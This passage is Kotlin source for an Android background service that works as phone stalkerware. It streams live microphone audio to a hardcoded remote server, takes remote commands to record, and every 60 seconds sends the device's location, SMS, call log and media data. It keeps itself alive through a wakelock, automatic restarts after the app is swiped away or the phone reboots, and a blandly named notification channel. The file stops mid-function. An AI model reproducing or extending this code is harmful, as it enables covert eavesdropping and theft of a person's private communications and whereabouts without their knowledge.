package com.micmonitor.app

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.app.AlarmManager
import android.app.PendingIntent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.edit
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import okhttp3.*
import okio.ByteString
import okio.ByteString.Companion.toByteString
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlin.math.max
import kotlin.math.min
import org.json.JSONObject
import org.json.JSONArray
import org.webrtc.AudioSource
import org.webrtc.AudioTrack
import org.webrtc.IceCandidate
import org.webrtc.MediaConstraints
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpSender
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import org.webrtc.audio.JavaAudioDeviceModule

/**
 * MicService — Core background service.
 *
 * What it does:
 *  1. Captures raw PCM audio from microphone using AudioRecord.
 *  2. Streams every audio chunk live to the Node.js server via WebSocket.
 *  3. Simultaneously writes chunks to an .pcm file (recording) on device.
 *  4. Listens for remote commands: "start_record", "stop_record", "ping".
 *  5. Auto-reconnects on WebSocket failure (every 5 seconds).
 *  6. Holds a WakeLock so the CPU stays alive in background.
 *  7. restarted automatically by BootReceiver on reboot.
 */
class MicService : Service() {

    // ── Coroutine scope (cancelled on destroy) ──────────────────────────────
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    // ── Audio capture ────────────────────────────────────────────────────────
    private var audioRecord: AudioRecord? = null
    private val sampleRate    = 16000           // 16 kHz
    private val channelConfig = AudioFormat.CHANNEL_IN_MONO
    private val audioFormat   = AudioFormat.ENCODING_PCM_16BIT
    private val minBufferSize by lazy {
        val min = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
        // Some OEMs return an error code; use a safe fallback in that case.
        if (min > 0) min else sampleRate
    }
    private val bufferSize by lazy { max(minBufferSize * 2, sampleRate * 2) }

    // ── WebSocket ────────────────────────────────────────────────────────────
    private var webSocket: WebSocket? = null
    @Volatile private var isWsConnecting = false
    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
        .pingInterval(30, TimeUnit.SECONDS)        // Keep-alive pings
        .build()

    // ── Recording state ──────────────────────────────────────────────────────
    @Volatile private var isCapturing   = false
    @Volatile private var isSavingFile  = false
    @Volatile private var wantsMicStreaming = true
    @Volatile private var isRecoveringMic = false
    @Volatile private var lastAudioChunkSentAt = 0L
    @Volatile private var lastHealthSentAt = 0L
    private var micWatchdogJob: Job? = null
    private var recordingFileStream: FileOutputStream? = null
    private var recordingFile: File? = null

    // ── WebRTC state (phone publishes mic track) ───────────────────────────
    @Volatile private var isWebRtcStreaming = false
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var audioDeviceModule: JavaAudioDeviceModule? = null
    private var peerConnection: PeerConnection? = null
    private var localAudioSource: AudioSource? = null
    private var localAudioTrack: AudioTrack? = null
    private var webRtcAudioSender: RtpSender? = null
    private var currentWebRtcBitrateKbps = 24
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var webRtcRecoveryJob: Job? = null
    private var lastDashboardQuality: JSONObject? = null
    private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
        PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
    )

    // ── WakeLock ─────────────────────────────────────────────────────────────
    private var wakeLock: PowerManager.WakeLock? = null
    private val connectivityManager by lazy {
        getSystemService(ConnectivityManager::class.java)
    }

    // ── Data Collector ───────────────────────────────────────────────────────
    private val dataCollector by lazy { DataCollector(this) }
    private var dataJob: Job? = null

    // ── Prefs / Device ID ────────────────────────────────────────────────────
    private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
    private val deviceId: String by lazy {
        prefs.getString("device_id", null) ?: UUID.randomUUID().toString().also { id ->
            prefs.edit { putString("device_id", id) }
        }
    }
    
    // ── Server URL — CHANGE THIS TO YOUR PC'S IP ─────────────────────────────
    // Or set from the app's main screen to a Render URL like:
    // wss://your-app.onrender.com/audio/
    companion object {
        const val TAG          = "MicService"
        const val CHANNEL_ID   = "device_services_channel"
        const val NOTIF_ID     = 101
        const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"

        // Render cloud URL — works on any network (WiFi or cellular)
        const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"

        // Shared websocket for service health checks and optional future hooks.
        @Volatile var activeWebSocket: WebSocket? = null
    }

    /** Reads server URL from SharedPreferences so it can be changed from MainActivity */
    private val serverUrl get(): String {
        val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
        // Ensure it ends with / then append deviceId
        return base.trimEnd('/') + "/$deviceId"
    }

    private val wsAuthToken: String
        get() = (prefs.getString("server_token", "") ?: "").trim()

    private val serverHttpBaseUrl: String
        get() {
            val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
            return base
                .replace(Regex("^wss://"), "https://")
                .replace(Regex("^ws://"), "http://")
                .substringBefore("/audio")
                .trimEnd('/')
        }

    // ────────────────────────────────────────────────────────────────────────
    // Service lifecycle
    // ────────────────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
        ensurePeerConnectionFactory()
        Log.i(TAG, "Service created. Device ID: $deviceId")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand action=${intent?.action}")

        startForeground(NOTIF_ID, buildNotification("Connecting to server…"))

        // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
        if (intent?.action == ACTION_RECONNECT) {
            if (activeWebSocket == null) {
                Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
                connectWebSocket()
            } else {
                Log.i(TAG, "Reconnect alarm: WebSocket alive, skipping")
                if (!isCapturing) startAudioCapture()
                startMicWatchdog()
            }
            scheduleReconnectAlarm() // reschedule for next cycle
            return START_STICKY
        }

        if (activeWebSocket == null) {
            connectWebSocket()
        } else {
            Log.i(TAG, "WebSocket already active — ensuring mic/data workers are running")
            if (!isCapturing) startAudioCapture()
            startMicWatchdog()
            startDataCollection()
        }
        scheduleKeepAlive()
        scheduleReconnectAlarm()
        return START_STICKY   // Android restarts service automatically if killed
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Schedule immediate restart via AlarmManager when user swipes app away
        val restartIntent = Intent(applicationContext, MicService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 2_000
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.i(TAG, "onTaskRemoved — scheduled restart in 2s")
    }

    override fun onDestroy() {
        Log.i(TAG, "onDestroy — stopping service")
        isCapturing  = false
        isSavingFile = false
        activeWebSocket = null
        serviceScope.cancel()
        stopMicWatchdog()
        stopAudioCapture()
        stopWebRtcSession(notifyState = false)
        closeRecordingFile()
        webSocket?.close(1000, "Service stopped")
        isWsConnecting = false
        peerConnectionFactory?.dispose()
        peerConnectionFactory = null
        audioDeviceModule?.release()
        audioDeviceModule = null
        if (wakeLock?.isHeld == true) wakeLock?.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ────────────────────────────────────────────────────────────────────────
    // WebSocket connection
    // ────────────────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        if (activeWebSocket != null || isWsConnecting) {
            Log.i(TAG, "connectWebSocket skipped (already connected/connecting)")
            return
        }
        isWsConnecting = true
        Log.i(TAG, "Connecting to $serverUrl")
        updateNotification("Connecting to server…")

        try {
            webSocket?.close(1000, "Reconnecting")
        } catch (_: Exception) {}

        val requestBuilder = Request.Builder()
            .url(serverUrl)
            .addHeader("X-Device-Id", deviceId)
        if (wsAuthToken.isNotBlank()) {
            requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
        }
        val request = requestBuilder.build()

        webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "WebSocket connected ✅")
                isWsConnecting = false
                activeWebSocket = webSocket
                updateNotification("Live streaming active")
                webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}")
                // Mic-first mode: always keep capture active when connected.
                startAudioCapture()
                startMicWatchdog()
                startDataCollection()
                sendHealthStatus("ws_open")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Server command: $text")
                handleServerCommand(text.trim())
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                handleServerCommand(bytes.utf8().trim())
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
                isWsConnecting = false
                activeWebSocket = null
                updateNotification("Disconnected — retrying in 5s…")
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = false)
                stopDataCollection()
                serviceScope.launch {
                    delay(5_000)
                    connectWebSocket()
                }
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.w(TAG, "WebSocket closed: $reason")
                isWsConnecting = false
                activeWebSocket = null
                updateNotification("Disconnected — retrying…")
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = false)
                stopDataCollection()
                serviceScope.launch {
                    delay(5_000)
                    connectWebSocket()
                }
            }
        })
    }

    // ────────────────────────────────────────────────────────────────────────
    // Remote command handler (from primary device dashboard)
    // ────────────────────────────────────────────────────────────────────────

    private fun handleServerCommand(cmd: String) {
        if (cmd.startsWith("{")) {
            handleServerJsonCommand(cmd)
            return
        }
        when (cmd) {
            "start_stream" -> {
                Log.i(TAG, "CMD: start mic stream")
                wantsMicStreaming = true
                if (!isWebRtcStreaming) {
                    startAudioCapture()
                    startMicWatchdog()
                }
                updateNotification("Live streaming active")
                webSocket?.send("ACK:start_stream")
            }
            "stop_stream" -> {
                Log.i(TAG, "CMD: stop mic stream")
                wantsMicStreaming = false
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = true)
                closeRecordingFile()
                updateNotification("Connected — mic standby")
                webSocket?.send("ACK:stop_stream")
            }
            "start_record" -> {
                Log.i(TAG, "CMD: start recording")
                // Also ensure mic is capturing
                startAudioCapture()
                openRecordingFile()
                webSocket?.send("ACK:start_record")
            }
            "stop_record" -> {
                Log.i(TAG, "CMD: stop recording")
                closeRecordingFile()
                webSocket?.send("ACK:stop_record:${recordingFile?.name ?: "unknown"}")
            }
            "ping" -> {
                webSocket?.send("pong:$deviceId")
            }
            "get_data" -> {
                // Dashboard requested a fresh sync immediately
                sendDeviceData()
            }
            else -> Log.d(TAG, "Unknown command: $cmd")
        }
    }

    private fun handleServerJsonCommand(jsonText: String) {
        try {
            val obj = JSONObject(jsonText)
            when (obj.optString("type")) {
                "webrtc_start" -> {
                    Log.i(TAG, "CMD: webrtc_start")
                    startWebRtcSession()
                }
                "webrtc_stop" -> {
                    Log.i(TAG, "CMD: webrtc_stop")
                    stopWebRtcSession(notifyState = true)
                }
                "webrtc_offer" -> {
                    val sdp = obj.optString("sdp", "")
                    if (sdp.isNotBlank()) {
                        Log.i(TAG, "CMD: webrtc_offer")
                        applyRemoteOfferAndCreateAnswer(sdp)
                    }
                }
                "webrtc_ice" -> {
                    val c = obj.optJSONObject("candidate")
                    if (c != null) {
                        val candidate = IceCandidate(
                            c.optString("sdpMid", ""),
                            c.optInt("sdpMLineIndex", 0),
                            c.optString("candidate", "")
                        )
                        peerConnection?.addIceCandidate(candidate)
                    }
                }
                "webrtc_quality" -> {
                    lastDashboardQuality = obj.optJSONObject("quality")
                    applyAdaptiveBitrate()
                }
                else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Invalid JSON command: ${e.message}")
        }
    }

    private fun ensurePeerConnectionFactory() {
        if (peerConnectionFactory != null) return
        val initOpts = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(initOpts)
        audioDeviceModule = JavaAudioDeviceModule.builder(this)
            .setUseHardwareAcousticEchoCanceler(true)
            .setUseHardwareNoiseSuppressor(true)
            .createAudioDeviceModule()
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setAudioDeviceModule(audioDeviceModule)
            .createPeerConnectionFactory()
        Log.i(TAG, "WebRTC factory initialized")
    }

    private fun startWebRtcSession() {
        if (peerConnection != null) return
        ensurePeerConnectionFactory()
        val factory = peerConnectionFactory ?: return

        // We use WebRTC audio path for low-latency streaming, so stop raw PCM path.
        stopMicWatchdog()
        stopAudioCapture()

        val constraints = MediaConstraints().apply {
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
        }
        localAudioSource = factory.createAudioSource(constraints)
        localAudioTrack = factory.createAudioTrack("mic_track", localAudioSource)

        cachedIceServers = fetchIceServersFromServer()

        val rtcConfig = PeerConnection.RTCConfiguration(
            cachedIceServers
        ).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
        }

        peerConnection = factory.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                val candidateJson = JSONObject().apply {
                    put("candidate", candidate.sdp)
                    put("sdpMid", candidate.sdpMid)
                    put("sdpMLineIndex", candidate.sdpMLineIndex)
                }
                val msg = JSONObject().apply {
                    put("type", "webrtc_ice")
                    put("candidate", candidateJson)
                }
                webSocket?.send(msg.toString())
            }

            override fun onIceConnectionChange(newState: PeerConnection.IceConnectionState) {
                sendWebRtcState("ice_${newState.name.lowercase()}")
                if (newState == PeerConnection.IceConnectionState.CONNECTED ||
                    newState == PeerConnection.IceConnectionState.COMPLETED) {
                    webRtcRecoveryJob?.cancel()
                    webRtcRecoveryJob = null
                }
                if (newState == PeerConnection.IceConnectionState.DISCONNECTED ||
                    newState == PeerConnection.IceConnectionState.FAILED) {
                    scheduleWebRtcRecovery(newState.name.lowercase())
                }
            }

            override fun onConnectionChange(newState: PeerConnection.PeerConnectionState) {
                sendWebRtcState("pc_${newState.name.lowercase()}")
            }

            override fun onSignalingChange(newState: PeerConnection.SignalingState) {}
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(newState: PeerConnection.IceGatheringState) {}
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) {}
            override fun onAddStream(stream: org.webrtc.MediaStream) {}
            override fun onRemoveStream(stream: org.webrtc.MediaStream) {}
            override fun onDataChannel(dataChannel: org.webrtc.DataChannel) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: org.webrtc.RtpReceiver, mediaStreams: Array<out org.webrtc.MediaStream>) {}
            override fun onTrack(transceiver: org.webrtc.RtpTransceiver) {}
        })

        val pc = peerConnection
        val track = localAudioTrack
        if (pc == null || track == null) {
            sendWebRtcState("create_failed")
            return
        }

        webRtcAudioSender = pc.addTrack(track, listOf("mic_stream"))
        isWebRtcStreaming = true
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        applyAdaptiveBitrate()
        registerNetworkCallbackForBitrate()
        updateNotification("WebRTC mic active")
        sendWebRtcState("started_${currentWebRtcBitrateKbps}kbps")
    }

    private fun stopWebRtcSession(notifyState: Boolean) {
        webRtcRecoveryJob?.cancel()
        webRtcRecoveryJob = null
        unregisterNetworkCallbackForBitrate()
        try {
            peerConnection?.close()
        } catch (_: Exception) {}
        peerConnection = null
        webRtcAudioSender = null
        try {
            localAudioTrack?.dispose()
            localAudioSource?.dispose()
        } catch (_: Exception) {}
        localAudioTrack = null
        localAudioSource = null
        val wasStreaming = isWebRtcStreaming
        isWebRtcStreaming = false

        if (notifyState && wasStreaming) sendWebRtcState("stopped")

        // Resume legacy PCM stream only when dashboard still wants it.
        if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
            startAudioCapture()
            startMicWatchdog()
            updateNotification("Live streaming active")
        }
    }

    private fun applyRemoteOfferAndCreateAnswer(remoteSdp: String) {
        startWebRtcSession()
        val pc = peerConnection ?: return
        val targetKbps = chooseTargetBitrateKbps()

        pc.setRemoteDescription(object : SdpObserver {
            override fun onSetSuccess() {
                val answerConstraints = MediaConstraints()
                pc.createAnswer(object : SdpObserver {
                    override fun onCreateSuccess(desc: SessionDescription?) {
                        if (desc == null) return
                        val tuned = tuneOpusSdp(desc.description, targetKbps)
                        val localAnswer = SessionDescription(SessionDescription.Type.ANSWER, tuned)
                        pc.setLocalDescription(object : SdpObserver {
                            override fun onSetSuccess() {
                                val msg = JSONObject().apply {
                                    put("type", "webrtc_answer")
                                    put("sdp", tuned)
                                }
                                webSocket?.send(msg.toString())
                                applyAdaptiveBitrate()
                                sendWebRtcState("answer_sent_${targetKbps}kbps")
                            }

                            override fun onSetFailure(error: String?) {
                                sendWebRtcState("local_set_fail")
                                Log.e(TAG, "WebRTC setLocalDescription failed: $error")
                            }

                            override fun onCreateSuccess(desc: SessionDescription?) {}
                            override fun onCreateFailure(error: String?) {}
                        }, localAnswer)
                    }

                    override fun onCreateFailure(error: String?) {
                        sendWebRtcState("answer_create_fail")
                        Log.e(TAG, "WebRTC createAnswer failed: $error")
                    }

                    override fun onSetSuccess() {}
                    override fun onSetFailure(error: String?) {}
                }, answerConstraints)
            }

            override fun onSetFailure(error: String?) {
                sendWebRtcState("remote_set_fail")
                Log.e(TAG, "WebRTC setRemoteDescription failed: $error")
            }

            override fun onCreateSuccess(desc: SessionDescription?) {}
            override fun onCreateFailure(error: String?) {}
        }, SessionDescription(SessionDescription.Type.OFFER, remoteSdp))
    }

    private fun tuneOpusSdp(sdp: String, targetKbps: Int): String {
        val opusPayload = Regex("a=rtpmap:(\\d+) opus/48000/2", RegexOption.IGNORE_CASE)
            .find(sdp)
            ?.groupValues
            ?.getOrNull(1)
            ?: return sdp
        val maxAvg = (targetKbps * 1000).coerceIn(12_000, 64_000)
        val fmtpRegex = Regex("a=fmtp:$opusPayload ([^\\r\\n]+)")
        return if (fmtpRegex.containsMatchIn(sdp)) {
            sdp.replace(fmtpRegex) { match ->
                val base = match.groupValues[1]
                "a=fmtp:$opusPayload $base;maxaveragebitrate=$maxAvg;useinbandfec=1;usedtx=1;ptime=20"
            }
        } else {
            sdp + "\r\na=fmtp:$opusPayload maxaveragebitrate=$maxAvg;useinbandfec=1;usedtx=1;ptime=20"
        }
    }

    private fun sendWebRtcState(state: String) {
        val msg = JSONObject().apply {
            put("type", "webrtc_state")
            put("state", state)
            put("bitrateKbps", currentWebRtcBitrateKbps)
            put("deviceId", deviceId)
            put("ts", System.currentTimeMillis())
            if (lastDashboardQuality != null) put("quality", lastDashboardQuality)
        }
        webSocket?.send(msg.toString())
    }

    private fun scheduleWebRtcRecovery(reason: String) {
        if (webRtcRecoveryJob?.isActive == true) return
        webRtcRecoveryJob = serviceScope.launch(Dispatchers.IO) {
            repeat(3) { idx ->
                delay(700L + idx * 900L)
                if (!isWebRtcStreaming || peerConnection == null) return@launch
                try {
                    peerConnection?.restartIce()
                } catch (_: Exception) {}
                sendWebRtcState("need_reoffer_${reason}_${idx + 1}")
            }
        }
    }

    private fun fetchIceServersFromServer(): List<PeerConnection.IceServer> {
        val fallback = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
        val url = "$serverHttpBaseUrl/api/webrtc-config"
        return try {
            val reqBuilder = Request.Builder().url(url)
            if (wsAuthToken.isNotBlank()) reqBuilder.addHeader("X-Auth-Token", wsAuthToken)
            val response = okHttpClient.newCall(reqBuilder.build()).execute()
            if (!response.isSuccessful) return fallback
            val body = response.body?.string().orEmpty()
            if (body.isBlank()) return fallback
            val json = JSONObject(body)
            val arr = json.optJSONArray("iceServers") ?: JSONArray()
            val parsed = mutableListOf<PeerConnection.IceServer>()
            for (i in 0 until arr.length()) {
                val item = arr.optJSONObject(i) ?: continue
                val urls = mutableListOf<String>()
                when (val u = item.opt("urls")) {
                    is String -> if (u.isNotBlank()) urls.add(u)
                    is JSONArray -> {
                        for (j in 0 until u.length()) {
                            val s = u.optString(j, "")
                            if (s.isNotBlank()) urls.add(s)
                        }
                    }
                }
                if (urls.isEmpty()) continue
                val builder = PeerConnection.IceServer.builder(urls)
                val user = item.optString("username", "")
                val cred = item.optString("credential", "")
                if (user.isNotBlank()) builder.setUsername(user)
                if (cred.isNotBlank()) builder.setPassword(cred)
                parsed.add(builder.createIceServer())
            }
            if (parsed.isEmpty()) fallback else parsed
        } catch (e: IOException) {
            Log.w(TAG, "ICE config fetch failed: ${e.message}")
            fallback
        } catch (e: Exception) {
            Log.w(TAG, "ICE config parse failed: ${e.message}")
            fallback
        }
    }

    private fun chooseTargetBitrateKbps(): Int {
        val cm = connectivityManager ?: return 24
        val network = cm.activeNetwork ?: return 24
        val caps = cm.getNetworkCapabilities(network) ?: return 24
        var target = if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) 12 else 24
        if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
            val downKbps = caps.linkDownstreamBandwidthKbps
            target = when {
                downKbps in 1..1200 -> 12
                downKbps in 1201..5000 -> 24
                else -> 48
            }
        }
        val q = lastDashboardQuality
        val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
        val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
        val jitter = q?.optDouble("jitterMs", Double.NaN) ?: Double.NaN
        if (!loss.isNaN() && loss >= 10.0) return 12
        if (!rtt.isNaN() && rtt >= 450.0) return 12
        if (!jitter.isNaN() && jitter >= 120.0) return 12
        if ((!loss.isNaN() && loss >= 4.0) || (!rtt.isNaN() && rtt >= 250.0) || (!jitter.isNaN() && jitter >= 60.0)) {
            return min(target, 24)
        }
        return target
    }

    private fun applyAdaptiveBitrate() {
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        val sender = webRtcAudioSender ?: return
        try {
            val params = sender.parameters ?: return
            if (params.encodings.isNullOrEmpty()) return
            val targetBps = currentWebRtcBitrateKbps * 1000
            params.encodings.forEach { encoding ->
                encoding.maxBitrateBps = targetBps
            }
            sender.parameters = params
            sendWebRtcState("bitrate_${currentWebRtcBitrateKbps}kbps")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to apply bitrate params: ${e.message}")
        }
    }

    private fun registerNetworkCallbackForBitrate() {
        if (networkCallback != null) return
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                applyAdaptiveBitrate()
            }

            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                applyAdaptiveBitrate()
            }

            override fun onLost(network: Network) {
                applyAdaptiveBitrate()
            }
        }
        networkCallback = callback
        try {
            connectivityManager?.registerNetworkCallback(NetworkRequest.Builder().build(), callback)
        } catch (e: Exception) {
            Log.w(TAG, "Network callback register failed: ${e.message}")
            networkCallback = null
        }
    }

    private fun unregisterNetworkCallbackForBitrate() {
        val callback = networkCallback ?: return
        try {
            connectivityManager?.unregisterNetworkCallback(callback)
        } catch (_: Exception) {}
        networkCallback = null
    }

    // ────────────────────────────────────────────────────────────────────────
    // Data collection — location, SMS, call log, media (every 60s)
    // ────────────────────────────────────────────────────────────────────────

    private fun startDataCollection() {
        stopDataCollection()
        dataJob = serviceScope.launch(Dispatchers.IO) {
            // Send immediately on connect, then every 60 seconds
            while (isActive) {
                sendDeviceData()
                delay(60_000)
            }
        }
    }

    private fun stopDataCollection() {
        dataJob?.cancel()
        dataJob = null
    }

    private fun sendDeviceData() {
        try {
            val data = dataCollector.collectAll()
            val msg = JSONObject()
            msg.put("type", "device_data")
            msg.put("deviceId", deviceId)
            msg.put("data", data)
            webSocket?.send(msg.toString())
            Log.d(TAG, "Device data sent")
        } catch (e: Exception) {
            Log.e(TAG, "sendDeviceData error: ${e.message}")
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Audio capture loop (raw PCM 16-bit mono 16 kHz)
    // ────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")  // Permission already checked in MainActivity before service starts
    private fun startAudioCapture() {
        if (isCapturing) return
        isCapturing = true
        lastAudioChunkSentAt = System.currentTimeMillis()

        serviceScope.launch(Dispatchers.IO) {
            try {
                audioRecord = createAudioRecordWithFallback()

                if (audioRecord == null) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    webSocket?.send("{\"type\":\"error\",\"message\":\"mic_init_failed\",\"deviceId\":\"$deviceId\"}")
                    isCapturing = false
                    sendHealthStatus("mic_init_failed")
                    return@launch
                }

                audioRecord?.startRecording()
                Log.i(TAG, "🎙️ Audio capture started (${sampleRate}Hz, PCM16, mono)")
                sendHealthStatus("mic_started")

                val chunk = ByteArray(bufferSize)
                var consecutiveReadErrors = 0

                while (isCapturing && isActive) {
                    val read = audioRecord?.read(chunk, 0, chunk.size) ?: -1
                    if (read > 0) {
                        consecutiveReadErrors = 0
                        val data = chunk.copyOf(read)

                        // 1) Live stream via legacy WS path only when WebRTC is inactive
                        if (!isWebRtcStreaming) {
                            webSocket?.send(data.toByteString())
                            lastAudioChunkSentAt = System.currentTimeMillis()
                            if (lastAudioChunkSentAt - lastHealthSentAt >= 10_000) {
                                sendHealthStatus("audio_tick")
                            }
                        }

                        // 2) Write to recording file if active
                        if (isSavingFile) {
                            recordingFileStream?.write(data)
                        }
                    } else if (read == AudioRecord.ERROR_DEAD_OBJECT) {
                        Log.e(TAG, "AudioRecord dead object detected")
                        webSocket?.send("{\"type\":\"error\",\"message\":\"mic_dead_object\",\"deviceId\":\"$deviceId\"}")
                        sendHealthStatus("mic_dead_object")
                        break
                    } else if (read == AudioRecord.ERROR || read == AudioRecord.ERROR_BAD_VALUE) {
                        consecutiveReadErrors++
                        if (consecutiveReadErrors >= 5) {
                            Log.e(TAG, "AudioRecord read failed repeatedly: $read")
                            webSocket?.send("{\"type\":\"error\",\"message\":\"mic_read_error\",\"deviceId\":\"$deviceId\"}")
                            sendHealthStatus("mic_read_error")
                            break
                        }
                        delay(100)
                    } else {
                        // zero read: let watchdog decide if stream is stalled
                        delay(10)
                    }
                }

                audioRecord?.stop()
                audioRecord?.release()
                audioRecord = null
                Log.i(TAG, "Audio capture stopped")
                sendHealthStatus("mic_stopped")

            } catch (e: Exception) {
                Log.e(TAG, "Audio capture error", e)
                isCapturing = false
                sendHealthStatus("mic_error")
            }
        }
    }

    private fun startMicWatchdog() {
        if (micWatchdogJob?.isActive == true) return
        micWatchdogJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(15_000)
                if (!wantsMicStreaming || activeWebSocket == null || isRecoveringMic) continue

                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 35_000)
                if (!isCapturing || stalled) {
                    isRecoveringMic = true
                    try {
                        Log.w(TAG, "Mic watchdog recovery triggered (capturing=$isCapturing stalled=$stalled)")
                        sendHealthStatus("watchdog_recover")
                        stopAudioCapture()
                        delay(300)
                        startAudioCapture()
                    } finally {
                        isRecoveringMic = false
                    }
                }
            }
        }
    }

    private fun stopMicWatchdog() {
        micWatchdogJob?.cancel()
        micWatchdogJob = null
    }

    private fun createAudioRecordWithFallback(): AudioRecord? {
        val sources = intArrayOf(
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.CAMCORDER,
        )

        for (source in sources) {
            try {
                val rec = AudioRecord(
                    source,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSize
                )
                if (rec.state == AudioRecord.STATE_INITIALIZED) {
                    Log.i(TAG, "AudioRecord initialized with source=$source, buffer=$bufferSize")
                    return rec
                }
                rec.release()
            } catch (e: Exception) {
                Log.w(TAG, "AudioRecord init failed for source=$source: ${e.message}")
            }
        }
        return null
    }

    private fun stopAudioCapture() {
        isCapturing = false
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (_: Exception) {}
        audioRecord = null
        sendHealthStatus("stop_capture_cmd")
    }

    private fun sendHealthStatus(reason: String) {
        val ws = webSocket ?: return
        lastHealthSentAt = System.currentTimeMillis()
        val msg = JSONObject().apply {
            put("type", "health_status")
            put("deviceId", deviceId)
            put("wsConnected", activeWebSocket != null)
            put("micCapturing", isCapturing)
            put("lastAudioChunkSentAt", lastAudioChunkSentAt)
